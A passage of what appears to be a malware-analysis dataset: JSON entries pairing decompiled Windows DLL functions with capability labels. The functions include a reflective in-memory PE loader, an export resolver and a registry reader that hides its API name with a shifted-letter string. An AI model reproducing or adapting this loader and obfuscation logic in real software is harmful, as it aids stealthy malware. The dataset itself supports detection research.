            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "18000a67": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.18000a670(int16_t *arg1, ulong arg2, code *arg3, code *arg4)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    ulong uVar3;\n    int64_t *arg4_00;\n    uchar *puVar4;\n    int64_t arg2_00;\n    int32_t *arg3_00;\n    uint64_t uVar5;\n    int16_t *piVar6;\n    uchar *puVar7;\n    int64_t in_stack_00000028;\n    int64_t in_stack_00000030;\n    int64_t in_stack_00000038;\n    int64_t in_stack_00000040;\n    uint32_t uStack192;\n    uint64_t uStack176;\n    int64_t iStack168;\n    uint32_t uStack140;\n    uchar *puStack72;\n    uint64_t uStack64;\n    uint32_t uStack40;\n    \n    uStack176 = 0;\n    iVar1 = fcn.1800098a0(arg2, 0x40);\n    if (iVar1 != 0) {\n        if (*arg1 == 0x5a4d) {\n            iVar1 = fcn.1800098a0(arg2, *(arg1 + 0x1e) + 0x108);\n            if (iVar1 != 0) {\n                arg3_00 = arg1 + *(arg1 + 0x1e);\n                if (*arg3_00 == 0x4550) {\n                    if (*(arg3_00 + 1) == -0x799c) {\n                        if ((arg3_00[0xe] & 1U) == 0) {\n                            puStack72 = arg3_00 + *(arg3_00 + 5) + 0x18;\n                            for (uStack192 = 0; uStack192 < *(arg3_00 + 6); uStack192 = uStack192 + 1) {\n                                if (*(puStack72 + 0x10) == 0) {\n                                    uStack64 = *(puStack72 + 0xc) + arg3_00[0xe];\n                                }\n                                else {\n                                    uStack64 = *(puStack72 + 0xc) + *(puStack72 + 0x10);\n                                }\n                                if (uStack176 < uStack64) {\n                                    uStack176 = uStack64;\n                                }\n                                puStack72 = puStack72 + 0x28;\n                            }\n                            (*_sym.imp.KERNEL32.dll_GetNativeSystemInfo)();\n                            uVar5 = arg3_00[0x14] + -1 + uStack140 & ~(uStack140 - 1);\n                            if (uVar5 == ((uStack176 - 1) + uStack140 & ~(uStack140 - 1))) {\n                                iStack168 = (*arg3)(*(arg3_00 + 0xc), uVar5, 0x3000, 4, in_stack_00000040);\n                                if ((iStack168 == 0) &&\n                                   (iStack168 = (*arg3)(0, uVar5, 0x3000, 4, in_stack_00000040),  iStack168 == 0)) {\n                                    (*_sym.imp.KERNEL32.dll_SetLastError)(0xe);\n                                }\n                                else {\n                                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n                                    arg4_00 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3, 8, 0x68);\n                                    if (arg4_00 == NULL) {\n                                        (*arg4)(iStack168, 0, 0x8000, in_stack_00000040);\n                                        (*_sym.imp.KERNEL32.dll_SetLastError)(0xe);\n                                    }\n                                    else {\n                                        arg4_00[1] = iStack168;\n                                        uStack40 = (*(arg3_00 + 0x16) & 0x2000) != 0;\n                                        *(arg4_00 + 4) = uStack40;\n                                        arg4_00[5] = arg3;\n                                        arg4_00[6] = arg4;\n                                        arg4_00[7] = in_stack_00000028;\n                                        arg4_00[8] = in_stack_00000030;\n                                        arg4_00[9] = in_stack_00000038;\n                                        arg4_00[10] = in_stack_00000040;\n                                        *(arg4_00 + 0xc) = uStack140;\n                                        iVar1 = fcn.1800098a0(arg2, arg3_00[0x15]);\n                                        if (iVar1 != 0) {\n                                            puVar4 = (*arg3)(iStack168, arg3_00[0x15], 0x1000, 4, in_stack_00000040);\n                                            piVar6 = arg1;\n                                            puVar7 = puVar4;\n                                            for (uVar5 = arg3_00[0x15]; uVar5 != 0; uVar5 = uVar5 - 1) {\n                                                *puVar7 = *piVar6;\n                                                piVar6 = piVar6 + 1;\n                                                puVar7 = puVar7 + 1;\n                                            }\n                                            *arg4_00 = puVar4 + *(arg1 + 0x1e);\n                                            *(*arg4_00 + 0x30) = iStack168;\n                                            iVar1 = fcn.1800098e0(arg1, arg2, arg3_00, arg4_00);\n                                            if (iVar1 != 0) {\n                                                arg2_00 = *(*arg4_00 + 0x30) - *(arg3_00 + 0xc);\n                                                if (arg2_00 == 0) {\n                                                    *(arg4_00 + 0x24) = 1;\n                                                }\n                                                else {\n                                                    uVar2 = fcn.18000a020(arg4_00, arg2_00);\n                                                    *(arg4_00 + 0x24) = uVar2;\n                                                }\n                                                iVar1 = fcn.18000a1d0(arg4_00);\n                                                if (((iVar1 != 0) && (iVar1 = fcn.180009d30(arg4_00),  iVar1 != 0)) &&\n                                                   (iVar1 = fcn.180009f70(arg4_00),  iVar1 != 0)) {\n                                                    if (*(*arg4_00 + 0x28) == 0) {\n                                                        arg4_00[0xb] = 0;\n                                                        return arg4_00;\n                                                    }\n                                                    if (*(arg4_00 + 4) == 0) {\n                                                        arg4_00[0xb] = iStack168 + *(*arg4_00 + 0x28);\n                                                        return arg4_00;\n                                                    }\n                                                    iVar1 = (*(iStack168 + *(*arg4_00 + 0x28)))(iStack168, 1, 0);\n                                                    if (iVar1 != 0) {\n                                                        *(arg4_00 + 0x1c) = 1;\n                                                        return arg4_00;\n                                                    }\n                                                    (*_sym.imp.KERNEL32.dll_SetLastError)(0x45a);\n                                                }\n                                            }\n                                        }\n                                        fcn.18000af00(arg4_00);\n                                    }\n                                }\n                            }\n                            else {\n                                (*_sym.imp.KERNEL32.dll_SetLastError)(0xc1);\n                            }\n                        }\n                        else {\n                            (*_sym.imp.KERNEL32.dll_SetLastError)(0xc1);\n                        }\n                    }\n                    else {\n                        (*_sym.imp.KERNEL32.dll_SetLastError)(0xc1);\n                    }\n                }\n                else {\n                    (*_sym.imp.KERNEL32.dll_SetLastError)(0xc1);\n                }\n            }\n        }\n        else {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(0xc1);\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 1736
    },
    "18000acf": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t fcn.18000acf0(int64_t *arg1, ulong arg2)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    uint32_t uStack64;\n    uint32_t uStack36;\n    uint32_t *puStack32;\n    uint16_t *puStack24;\n    \n    iVar3 = arg1[1];\n    uStack64 = 0;\n    if (*(*arg1 + 0x8c) == 0) {\n        (*_sym.imp.KERNEL32.dll_SetLastError)(0x7f);\n        iVar3 = 0;\n    }\n    else {\n        iVar4 = iVar3 + *(*arg1 + 0x88);\n        if ((*(iVar4 + 0x18) == 0) || (*(iVar4 + 0x14) == 0)) {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(0x7f);\n            iVar3 = 0;\n        }\n        else {\n            if (arg2 >> 0x10 == 0) {\n                if (arg2 < *(iVar4 + 0x10)) {\n                    (*_sym.imp.KERNEL32.dll_SetLastError)(0x7f);\n                    return 0;\n                }\n                uStack64 = arg2 - *(iVar4 + 0x10);\n            }\n            else {\n                puStack32 = iVar3 + *(iVar4 + 0x20);\n                puStack24 = iVar3 + *(iVar4 + 0x24);\n                bVar1 = false;\n                for (uStack36 = 0; uStack36 < *(iVar4 + 0x18); uStack36 = uStack36 + 1) {\n                    iVar2 = fcn.180024374(arg2, iVar3 + *puStack32);\n                    if (iVar2 == 0) {\n                        uStack64 = *puStack24;\n                        bVar1 = true;\n                        break;\n                    }\n                    puStack32 = puStack32 + 1;\n                    puStack24 = puStack24 + 1;\n                }\n                if (!bVar1) {\n                    (*_sym.imp.KERNEL32.dll_SetLastError)(0x7f);\n                    return 0;\n                }\n            }\n            if (*(iVar4 + 0x14) < uStack64) {\n                (*_sym.imp.KERNEL32.dll_SetLastError)(0x7f);\n                iVar3 = 0;\n            }\n            else {\n                iVar3 = iVar3 + *(iVar3 + *(iVar4 + 0x1c) + (uStack64 << 2));\n            }\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 579
    },
    "18000af0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.18000af00(int64_t *arg1)\n\n{\n    ulong uVar1;\n    int32_t iStack24;\n    \n    if (arg1 != NULL) {\n        if (*(arg1 + 0x1c) != 0) {\n            (*(*(*arg1 + 0x28) + arg1[1]))(arg1[1], 0, 0);\n        }\n        if (arg1[2] != 0) {\n            for (iStack24 = 0; iStack24 < *(arg1 + 3); iStack24 = iStack24 + 1) {\n                if (*(arg1[2] + iStack24 * 8) != 0) {\n                    (*arg1[9])(*(arg1[2] + iStack24 * 8));\n                }\n            }\n            fcn.180024024(arg1[2]);\n        }\n        if (arg1[1] != 0) {\n            (*arg1[6])(arg1[1], 0, 0x8000, arg1[10]);\n        }\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1, 0, arg1);\n    }\n    return;\n}\n",
        "token_count": 283
    },
    "18000b33": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.18000b330(int64_t arg1)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    uchar *puVar5;\n    uint32_t *puVar6;\n    uchar *puVar7;\n    uchar auStack312 [32];\n    uchar *puStack280;\n    uint32_t *puStack272;\n    uint uStack264;\n    int32_t iStack248;\n    int64_t iStack240;\n    uchar uStack232;\n    uchar auStack216 [8];\n    uint32_t uStack208;\n    uint32_t uStack203;\n    uint32_t uStack199;\n    int64_t iStack129;\n    uchar *apuStack121 [2];\n    uint uStack104;\n    uint32_t uStack100;\n    uchar *puStack96;\n    uint32_t uStack88;\n    uchar *puStack84;\n    uchar auStack72 [4];\n    uint32_t uStack68;\n    ulong uStack64;\n    ulong uStack56;\n    ulong uStack48;\n    ulong uStack40;\n    uint64_t uStack32;\n    \n    uStack64 = 0xfffffffffffffffe;\n    uStack32 = *0x180040248 ^ auStack312;\n    iStack248 = 0;\n    uStack232 = 1;\n    iStack240 = 0;\n    puVar5 = auStack216;\n    for (iVar3 = 0x67; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    uStack56 = fcn.1800020d0(arg1 + 0x48);\n    pcVar2 = fcn.18001e5f0(0x180039ad8);\n    iStack248 = (*pcVar2)(0xffffffff80000000, uStack56, &iStack240);\n    if (iStack248 == 0) {\n        uStack104 = 3;\n        uStack100 = 0;\n        uStack48 = fcn.1800020d0(arg1 + 0x20);\n        pcVar2 = fcn.18001e5f0(0x180039ae8);\n        puStack272 = &uStack100;\n        puStack280 = NULL;\n        iStack248 = (*pcVar2)(iStack240, uStack48, 0, &uStack104);\n        if (iStack248 == 0) {\n            if (uStack100 == 0) {\n                uStack232 = 1;\n            }\n            else {\n                puStack96 = fcn.180015b40(uStack100);\n                uStack40 = fcn.1800020d0(arg1 + 0x20);\n                pcVar2 = fcn.18001e5f0(\"SfhRvfszWbmvfFyX\");\n                puStack272 = &uStack100;\n                puStack280 = puStack96;\n                iStack248 = (*pcVar2)(iStack240, uStack40, 0, &uStack104);\n                if (iStack248 == 0) {\n                    puVar5 = puStack96;\n                    puVar7 = auStack216;\n                    for (iVar3 = 0x57; iVar3 != 0; iVar3 = iVar3 + -1) {\n                        *puVar7 = *puVar5;\n                        puVar5 = puVar5 + 1;\n                        puVar7 = puVar7 + 1;\n                    }\n                    if (uStack199 != 0) {\n                        apuStack121[0] = fcn.180015b40(uStack199);\n                        puVar5 = puStack96 + 0x57;\n                        puVar7 = apuStack121[0];\n                        for (uVar4 = uStack199; uVar4 != 0; uVar4 = uVar4 - 1) {\n                            *puVar7 = *puVar5;\n                            puVar5 = puVar5 + 1;\n                            puVar7 = puVar7 + 1;\n                        }\n                        iStack129 = fcn.180015b40(uStack203);\n                        fcn.18000eb30(auStack72);\n                        uStack264 = 5;\n                        puStack272 = &uStack208;\n                        puStack280 = puStack280 & 0xffffffff00000000 | uStack199;\n                        cVar1 = fcn.180003260(auStack72, iStack129, &uStack203, apuStack121[0]);\n                        if (cVar1 == '\\0') {\n                            uStack232 = 0;\n                            fcn.18000bcf0(auStack72);\n                        }\n                        else {\n                            puVar6 = &uStack88;\n                            for (iVar3 = 0xc; iVar3 != 0; iVar3 = iVar3 + -1) {\n                                *puVar6 = 0;\n                                puVar6 = puVar6 + 1;\n                            }\n                            uStack68 = 0;\n                            while (uStack68 < uStack203) {\n                                fcn.1800011f0(&uStack88, 0xc);\n                                uStack88 = *(iStack129 + uStack68);\n                                uStack68 = uStack68 + 4;\n                                puStack84 = fcn.180015b40(uStack88);\n                                puVar5 = iStack129 + uStack68;\n                                puVar7 = puStack84;\n                                for (uVar4 = uStack88; uVar4 != 0; uVar4 = uVar4 - 1) {\n                                    *puVar7 = *puVar5;\n                                    puVar5 = puVar5 + 1;\n                                    puVar7 = puVar7 + 1;\n                                }\n                                uStack68 = uStack68 + uStack88;\n                                fcn.18000b860(arg1, &uStack88);\n                            }\n                            fcn.18000bcf0(auStack72);\n                        }\n                    }\n                }\n                else {\n                    uStack232 = 0;\n                }\n            }\n        }\n        else {\n            uStack232 = iStack248 == 2;\n        }\n    }\n    else {\n        uStack232 = 0;\n    }\n    if (iStack240 != 0) {\n        pcVar2 = fcn.18001e5f0(0x180039b18);\n        (*pcVar2)(iStack240);\n    }\n    if (iStack129 != 0) {\n        fcn.180015b80(&iStack129);\n    }\n    if (apuStack121[0] != NULL) {\n        fcn.180015b80(apuStack121);\n    }\n    fcn.180023980(uStack32 ^ auStack312);\n    return;\n}\n",
        "token_count": 1491
    },
    "18000bbf": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.18000bbf0(int64_t *arg1)\n\n{\n    if (*arg1 != 0) {\n        fcn.18000bcf0(arg1);\n        fcn.18000bb20(arg1, *arg1, arg1[1]);\n        fcn.18000d120(arg1 + 3, *arg1, (arg1[2] - *arg1) / 0xc);\n    }\n    *arg1 = 0;\n    arg1[1] = 0;\n    arg1[2] = 0;\n    return;\n}\n",
        "token_count": 128
    },
    "18000bdb": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.18000bdb0(int64_t *arg1, uint64_t arg2)\n\n{\n    uint64_t uVar1;\n    int64_t arg4;\n    int64_t iVar2;\n    \n    uVar1 = fcn.18000bf30(arg1);\n    if (uVar1 < arg2) {\n        fcn.18000f030(arg1);\n    }\n    else {\n        uVar1 = fcn.18000bf00(arg1);\n        if (uVar1 < arg2) {\n            arg4 = fcn.18000c260(arg1 + 3, arg2);\n            fcn.18000c700(arg1, *arg1, arg1[1], arg4);\n            iVar2 = fcn.18000b810(arg1);\n            if (*arg1 != 0) {\n                fcn.18000bb20(arg1, *arg1, arg1[1]);\n                fcn.18000d120(arg1 + 3, *arg1, (arg1[2] - *arg1) / 0xc);\n            }\n            fcn.18000bcf0(arg1);\n            arg1[2] = arg4 + arg2 * 0xc;\n            arg1[1] = arg4 + iVar2 * 0xc;\n            *arg1 = arg4;\n        }\n    }\n    return;\n}\n",
        "token_count": 299
    },
    "18000c28": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00018000c2a9)\n\nulong fcn.18000c280(ulong arg1)\n\n{\n    return 0x1555555555555555;\n}\n",
        "token_count": 47
    },
    "18000c74": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t fcn.18000c740(uint64_t arg1, ulong arg2)\n\n{\n    int64_t iStack40;\n    uchar auStack32 [32];\n    \n    iStack40 = 0;\n    if ((arg1 != 0) && ((0x1555555555555555 < arg1 || (iStack40 = fcn.180023ef8(arg1 * 0xc),  iStack40 == 0)))) {\n        fcn.180001220(auStack32, 0);\n        fcn.180025954(auStack32, 0x18003e970);\n    }\n    return iStack40;\n}\n",
        "token_count": 142
    },
    "18000c86": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.18000c860(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    uchar *puVar1;\n    uchar *puVar2;\n    int64_t iVar3;\n    uchar *puVar4;\n    uchar auStack56 [40];\n    \n    puVar1 = fcn.1800012d0(0xc, arg2);\n    if (puVar1 != NULL) {\n        puVar2 = fcn.18000eb30(arg3);\n        puVar4 = auStack56;\n        for (iVar3 = 0xc; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar4 = *puVar2;\n            puVar2 = puVar2 + 1;\n            puVar4 = puVar4 + 1;\n        }\n        puVar2 = auStack56;\n        for (iVar3 = 0xc; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar1 = *puVar2;\n            puVar2 = puVar2 + 1;\n            puVar1 = puVar1 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 255
    },
    "18000c9b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.18000c9b0(ulong arg1, ulong arg2)\n\n{\n    uchar *puVar1;\n    uchar *puVar2;\n    int64_t iVar3;\n    uchar *puVar4;\n    uchar auStack48 [32];\n    \n    puVar1 = fcn.1800012d0(0xc, arg1);\n    if (puVar1 != NULL) {\n        puVar2 = fcn.18000eb30(arg2);\n        puVar4 = auStack48;\n        for (iVar3 = 0xc; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar4 = *puVar2;\n            puVar2 = puVar2 + 1;\n            puVar4 = puVar4 + 1;\n        }\n        puVar2 = auStack48;\n        for (iVar3 = 0xc; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar1 = *puVar2;\n            puVar2 = puVar2 + 1;\n            puVar1 = puVar1 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 253
    },
    "18000d19": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.18000d190(int64_t arg1, ulong arg2, ulong arg3)\n\n{\n    ulong uVar1;\n    char *pcVar2;\n    int64_t arg1_00;\n    ulong *puVar3;\n    int64_t *piVar4;\n    ulong *puVar5;\n    ulong arg1_01;\n    uchar *puVar6;\n    uchar *puVar7;\n    ulong auStackX24 [2];\n    int64_t iStack96;\n    int64_t iStack88;\n    int64_t iStack80;\n    int64_t iStack72;\n    int64_t iStack64;\n    \n    auStackX24[0] = arg3;\n    uVar1 = fcn.18000cec0(auStackX24);\n    pcVar2 = fcn.18000d0e0(uVar1);\n    if (*pcVar2 != '\\0') {\n        fcn.180023818(\"invalid map/set<T> iterator\");\n    }\n    arg1_00 = fcn.18000cec0(auStackX24);\n    fcn.18000de20(auStackX24);\n    puVar3 = fcn.18000eb30(arg1_00);\n    pcVar2 = fcn.18000d0e0(*puVar3);\n    iStack88 = arg1_00;\n    if (*pcVar2 == '\\0') {\n        puVar3 = fcn.18000d100(arg1_00);\n        pcVar2 = fcn.18000d0e0(*puVar3);\n        if (*pcVar2 == '\\0') {\n            iStack88 = fcn.18000cec0(auStackX24);\n            piVar4 = fcn.18000d100(iStack88);\n            iStack96 = *piVar4;\n        }\n        else {\n            piVar4 = fcn.18000eb30(arg1_00);\n            iStack96 = *piVar4;\n        }\n    }\n    else {\n        piVar4 = fcn.18000d100(arg1_00);\n        iStack96 = *piVar4;\n    }\n    if (iStack88 == arg1_00) {\n        piVar4 = fcn.18000d0f0(arg1_00);\n        iStack80 = *piVar4;\n        pcVar2 = fcn.18000d0e0(iStack96);\n        if (*pcVar2 == '\\0') {\n            piVar4 = fcn.18000d0f0(iStack96);\n            *piVar4 = iStack80;\n        }\n        piVar4 = fcn.18000cdd0(arg1);\n        if (*piVar4 == arg1_00) {\n            piVar4 = fcn.18000cdd0(arg1);\n            *piVar4 = iStack96;\n        }\n        else {\n            piVar4 = fcn.18000eb30(iStack80);\n            if (*piVar4 == arg1_00) {\n                piVar4 = fcn.18000eb30(iStack80);\n                *piVar4 = iStack96;\n            }\n            else {\n                piVar4 = fcn.18000d100(iStack80);\n                *piVar4 = iStack96;\n            }\n        }\n        piVar4 = fcn.18000cd90(arg1);\n        if (*piVar4 == arg1_00) {\n            pcVar2 = fcn.18000d0e0(iStack96);\n            iStack72 = iStack80;\n            if (*pcVar2 == '\\0') {\n                iStack72 = fcn.18000ddd0(iStack96);\n            }\n            piVar4 = fcn.18000cd90(arg1);\n            *piVar4 = iStack72;\n        }\n        piVar4 = fcn.18000cdb0(arg1);\n        if (*piVar4 == arg1_00) {\n            pcVar2 = fcn.18000d0e0(iStack96);\n            iStack64 = iStack80;\n            if (*pcVar2 == '\\0') {\n                iStack64 = fcn.18000dd90(iStack96);\n            }\n            piVar4 = fcn.18000cdb0(arg1);\n            *piVar4 = iStack64;\n        }\n    }\n    else {\n        puVar3 = fcn.18000eb30(arg1_00);\n        piVar4 = fcn.18000d0f0(*puVar3);\n        *piVar4 = iStack88;\n        puVar3 = fcn.18000eb30(arg1_00);\n        puVar5 = fcn.18000eb30(iStack88);\n        *puVar5 = *puVar3;\n        piVar4 = fcn.18000d100(arg1_00);\n        if (iStack88 == *piVar4) {\n            iStack80 = iStack88;\n        }\n        else {\n            piVar4 = fcn.18000d0f0(iStack88);\n            iStack80 = *piVar4;\n            pcVar2 = fcn.18000d0e0(iStack96);\n            if (*pcVar2 == '\\0') {\n                piVar4 = fcn.18000d0f0(iStack96);\n                *piVar4 = iStack80;\n            }\n            piVar4 = fcn.18000eb30(iStack80);\n            *piVar4 = iStack96;\n            puVar3 = fcn.18000d100(arg1_00);\n            puVar5 = fcn.18000d100(iStack88);\n            *puVar5 = *puVar3;\n            puVar3 = fcn.18000d100(arg1_00);\n            piVar4 = fcn.18000d0f0(*puVar3);\n            *piVar4 = iStack88;\n        }\n        piVar4 = fcn.18000cdd0(arg1);\n        if (*piVar4 == arg1_00) {\n            piVar4 = fcn.18000cdd0(arg1);\n            *piVar4 = iStack88;\n        }\n        else {\n            puVar3 = fcn.18000d0f0(arg1_00);\n            piVar4 = fcn.18000eb30(*puVar3);\n            if (*piVar4 == arg1_00) {\n                puVar3 = fcn.18000d0f0(arg1_00);\n                piVar4 = fcn.18000eb30(*puVar3);\n                *piVar4 = iStack88;\n            }\n            else {\n                puVar3 = fcn.18000d0f0(arg1_00);\n                piVar4 = fcn.18000d100(*puVar3);\n                *piVar4 = iStack88;\n            }\n        }\n        puVar3 = fcn.18000d0f0(arg1_00);\n        puVar5 = fcn.18000d0f0(iStack88);\n        *puVar5 = *puVar3;\n        uVar1 = fcn.18000d9d0(arg1_00);\n        arg1_01 = fcn.18000d9d0(iStack88);\n        fcn.18000df40(arg1_01, uVar1);\n    }\n    pcVar2 = fcn.18000d9d0(arg1_00);\n    if (*pcVar2 != '\\x01') {\ncode_r0x00018000d92b:\n        uVar1 = fcn.18000d110(arg1_00);\n        uVar1 = fcn.18000eb30(uVar1);\n        fcn.18000ca40(arg1 + 0x19, uVar1);\n        fcn.18000d120(arg1 + 0x18, arg1_00, 1);\n        if (*(arg1 + 0x10) != 0) {\n            *(arg1 + 0x10) = *(arg1 + 0x10) + -1;\n        }\n        fcn.18000d150(arg2, auStackX24[0], arg1);\n        return arg2;\n    }\ncode_r0x00018000d5b4:\n    piVar4 = fcn.18000cdd0(arg1);\n    if ((iStack96 == *piVar4) || (pcVar2 = fcn.18000d9d0(iStack96),  *pcVar2 != '\\x01')) goto code_r0x00018000d91e;\n    piVar4 = fcn.18000eb30(iStack80);\n    if (iStack96 == *piVar4) {\n        puVar3 = fcn.18000d100(iStack80);\n        iStack88 = *puVar3;\n        pcVar2 = fcn.18000d9d0(iStack88);\n        if (*pcVar2 == '\\0') {\n            puVar6 = fcn.18000d9d0(iStack88);\n            *puVar6 = 1;\n            puVar6 = fcn.18000d9d0(iStack80);\n            *puVar6 = 0;\n            fcn.18000db10(arg1, iStack80);\n            puVar3 = fcn.18000d100(iStack80);\n            iStack88 = *puVar3;\n        }\n        pcVar2 = fcn.18000d0e0(iStack88);\n        if (*pcVar2 == '\\0') {\n            puVar3 = fcn.18000eb30(iStack88);\n            pcVar2 = fcn.18000d9d0(*puVar3);\n            if (*pcVar2 == '\\x01') {\n                puVar3 = fcn.18000d100(iStack88);\n                pcVar2 = fcn.18000d9d0(*puVar3);\n                if (*pcVar2 == '\\x01') {\n                    puVar6 = fcn.18000d9d0(iStack88);\n                    *puVar6 = 0;\n                    goto code_r0x00018000d5a2;\n                }\n            }\n            puVar3 = fcn.18000d100(iStack88);\n            pcVar2 = fcn.18000d9d0(*puVar3);\n            if (*pcVar2 == '\\x01') {\n                puVar3 = fcn.18000eb30(iStack88);\n                puVar6 = fcn.18000d9d0(*puVar3);\n                *puVar6 = 1;\n                puVar6 = fcn.18000d9d0(iStack88);\n                *puVar6 = 0;\n                fcn.18000dc50(arg1, iStack88);\n                puVar3 = fcn.18000d100(iStack80);\n                iStack88 = *puVar3;\n            }\n            puVar6 = fcn.18000d9d0(iStack80);\n            puVar7 = fcn.18000d9d0(iStack88);\n            *puVar7 = *puVar6;\n            puVar6 = fcn.18000d9d0(iStack80);\n            *puVar6 = 1;\n            puVar3 = fcn.18000d100(iStack88);\n            puVar6 = fcn.18000d9d0(*puVar3);\n            *puVar6 = 1;\n            fcn.18000db10(arg1, iStack80);\ncode_r0x00018000d91e:\n            puVar6 = fcn.18000d9d0(iStack96);\n            *puVar6 = 1;\n            goto code_r0x00018000d92b;\n        }\n    }\n    else {\n        puVar3 = fcn.18000eb30(iStack80);\n        iStack88 = *puVar3;\n        pcVar2 = fcn.18000d9d0(iStack88);\n        if (*pcVar2 == '\\0') {\n            puVar6 = fcn.18000d9d0(iStack88);\n            *puVar6 = 1;\n            puVar6 = fcn.18000d9d0(iStack80);\n            *puVar6 = 0;\n            fcn.18000dc50(arg1, iStack80);\n            puVar3 = fcn.18000eb30(iStack80);\n            iStack88 = *puVar3;\n        }\n        pcVar2 = fcn.18000d0e0(iStack88);\n        if (*pcVar2 == '\\0') {\n            puVar3 = fcn.18000d100(iStack88);\n            pcVar2 = fcn.18000d9d0(*puVar3);\n            if (*pcVar2 == '\\x01') {\n                puVar3 = fcn.18000eb30(iStack88);\n                pcVar2 = fcn.18000d9d0(*puVar3);\n                if (*pcVar2 == '\\x01') {\n                    puVar6 = fcn.18000d9d0(iStack88);\n                    *puVar6 = 0;\n                    goto code_r0x00018000d5a2;\n                }\n            }\n            puVar3 = fcn.18000eb30(iStack88);\n            pcVar2 = fcn.18000d9d0(*puVar3);\n            if (*pcVar2 == '\\x01') {\n                puVar3 = fcn.18000d100(iStack88);\n                puVar6 = fcn.18000d9d0(*puVar3);\n                *puVar6 = 1;\n                puVar6 = fcn.18000d9d0(iStack88);\n                *puVar6 = 0;\n                fcn.18000db10(arg1, iStack88);\n                puVar3 = fcn.18000eb30(iStack80);\n                iStack88 = *puVar3;\n            }\n            puVar6 = fcn.18000d9d0(iStack80);\n            puVar7 = fcn.18000d9d0(iStack88);\n            *puVar7 = *puVar6;\n            puVar6 = fcn.18000d9d0(iStack80);\n            *puVar6 = 1;\n            puVar3 = fcn.18000eb30(iStack88);\n            puVar6 = fcn.18000d9d0(*puVar3);\n            *puVar6 = 1;\n            fcn.18000dc50(arg1, iStack80);\n            goto code_r0x00018000d91e;\n        }\n    }\ncode_r0x00018000d5a2:\n    iStack96 = iStack80;\n    piVar4 = fcn.18000d0f0(iStack80);\n    iStack80 = *piVar4;\n    goto code_r0x00018000d5b4;\n}\n",
        "token_count": 3263
    },
    "18000e2c": {
        "rules": [
